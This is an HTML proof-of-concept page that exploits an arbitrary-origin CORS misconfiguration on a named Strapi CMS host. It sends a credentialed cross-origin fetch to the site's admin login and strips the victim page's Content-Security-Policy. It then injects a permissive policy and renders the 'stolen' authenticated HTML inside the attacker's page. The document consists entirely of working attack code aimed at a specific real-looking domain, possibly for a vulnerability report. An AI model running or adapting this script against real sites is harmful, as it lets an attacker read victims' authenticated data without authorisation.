<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>CORS PoC – cms.bumba.global</title>

  <!-- This CSP applies to *our* PoC page. It allows inline JS so the demo runs. -->
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self' https://cms.bumba.global data: blob:; script-src 'self' 'unsafe-inline';">

  <style>
    body { font-family: system-ui, sans-serif; margin: 0; padding: 1rem; }
    h2   { margin-top: 0; }
    iframe { width: 100%; height: 600px; border: 1px solid #aaa; }
    pre { background: #f6f8fa; padding: .75rem; overflow-x: auto; max-height: 300px; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h2>Arbitrary‑Origin CORS PoC<br>
    <small>(Strapi Admin / Login rendered inside attacker origin)</small>
  </h2>

  <!-- Display stolen page -->
  <iframe id="viewer" title="Stolen Admin HTML"></iframe>

  <!-- Raw fallback -->
  <h3>Raw response (first 8 kB):</h3>
  <pre id="dump">loading…</pre>

  <script>
  (async () => {
    const viewer = document.getElementById('viewer');
    const dump   = document.getElementById('dump');

    try {
      /* 1️⃣  Cross‑origin request with credentials */
      const res  = await fetch('https://cms.bumba.global/admin/auth/login',
                               { credentials: 'include' });
      const htmlRaw = await res.text();

      /* 2️⃣  Clean & patch the HTML:
             - remove any CSP meta
             - add <base>
             - add a permissive CSP so scripts/styles load */
      let html = htmlRaw
        .replace(/<meta[^>]+http-equiv=["']Content-Security-Policy["'][^>]*>/ig, '')
        .replace(
          /<head[^>]*>/i,
          `<head><base href="https://cms.bumba.global/">
           <meta http-equiv="Content-Security-Policy"
                 content="default-src * data: blob: 'unsafe-inline' 'unsafe-eval';">`
        );

      /* 3️⃣  Render */
      viewer.srcdoc    = html;
      dump.textContent = htmlRaw.slice(0, 8192) +
                         (htmlRaw.length > 8192 ? '\n…(truncated)…' : '');
    } catch (err) {
      console.error(err);
      dump.textContent = 'Fetch failed: ' + err;
    }
  })();
  </script>
</body>
</html>
